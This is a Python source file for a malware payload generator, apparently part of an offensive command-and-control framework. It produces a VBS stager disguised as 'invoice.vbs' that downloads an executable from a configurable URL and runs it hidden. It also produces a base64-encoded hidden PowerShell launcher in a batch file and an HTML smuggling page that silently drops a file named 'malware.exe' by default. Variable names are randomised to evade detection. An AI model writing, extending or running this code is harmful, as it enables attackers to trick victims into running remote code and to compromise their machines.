import base64
import random
import string
import logging
from typing import Dict, Optional

logger = logging.getLogger(__name__)

class PayloadGenerator:
    """
    Generates obfuscated payloads for initial access.
    """
    
    def generate_payload(self, type: str, config: Dict) -> Dict:
        """
        Generates a payload based on type and config.
        config: { "c2_url": "...", "agent_id": "...", "command": "..." }
        """
        if type == "vbs":
            return self._generate_vbs(config)
        elif type == "powershell":
            return self._generate_powershell(config)
        elif type == "html":
            return self._generate_html_dropper(config)
        else:
            raise ValueError(f"Unknown payload type: {type}")

    def _generate_vbs(self, config: Dict) -> Dict:
        """Generates a VBS script stager."""
        # Simple downloader/executor
        url = config.get("url") # URL to download stage 2 or C2
        cmd = config.get("command")
        
        # Randomize variable names
        var_shell = self._random_string(8)
        var_http = self._random_string(8)
        var_stream = self._random_string(8)
        
        script = ""
        if cmd:
            script = f"""
            Dim {var_shell}
            Set {var_shell} = WScript.CreateObject("WScript.Shell")
            {var_shell}.Run "{cmd}", 0, False
            """
        elif url:
            # Dropper logic
            script = f"""
            Dim {var_http}, {var_stream}, {var_shell}
            Set {var_http} = CreateObject("MSXML2.ServerXMLHTTP")
            {var_http}.open "GET", "{url}", False
            {var_http}.send
            
            Set {var_stream} = CreateObject("ADODB.Stream")
            {var_stream}.Open
            {var_stream}.Type = 1
            {var_stream}.Write {var_http}.responseBody
            {var_stream}.SaveToFile "update.exe", 2
            {var_stream}.Close
            
            Set {var_shell} = CreateObject("WScript.Shell")
            {var_shell}.Run "update.exe", 0, False
            """
            
        return {
            "content": script,
            "filename": "invoice.vbs",
            "type": "vbs"
        }

    def _generate_powershell(self, config: Dict) -> Dict:
        """Generates an obfuscated PowerShell stager."""
        cmd = config.get("command", "whoami")
        
        # Base64 encode the command
        encoded_cmd = base64.b64encode(cmd.encode('utf-16le')).decode()
        
        # Basic PS1 launcher
        ps1 = f"powershell.exe -nop -w hidden -enc {encoded_cmd}"
        
        return {
            "content": ps1,
            "filename": "run.bat", # Trigger via bat
            "type": "bat"
        }

    def _generate_html_dropper(self, config: Dict) -> Dict:
        """Generates an HTML Smuggling payload."""
        payload_b64 = config.get("payload_b64", "")
        filename = config.get("filename", "malware.exe")
        
        html = f"""
        <html>
        <body>
        <script>
            function base64ToArrayBuffer(base64) {{
                var binary_string = window.atob(base64);
                var len = binary_string.length;
                var bytes = new Uint8Array(len);
                for (var i = 0; i < len; i++) {{
                    bytes[i] = binary_string.charCodeAt(i);
                }}
                return bytes.buffer;
            }}
            
            var file = "{payload_b64}";
            var data = base64ToArrayBuffer(file);
            var blob = new Blob([data], {{type: "octet/stream"}});
            var url = window.URL.createObjectURL(blob);
            
            var a = document.createElement("a");
            document.body.appendChild(a);
            a.style = "display: none";
            a.href = url;
            a.download = "{filename}";
            a.click();
            window.URL.revokeObjectURL(url);
        </script>
        Loading...
        </body>
        </html>
        """
        return {
            "content": html,
            "filename": "download.html",
            "type": "html"
        }

    def _random_string(self, length: int) -> str:
        return ''.join(random.choices(string.ascii_letters, k=length))
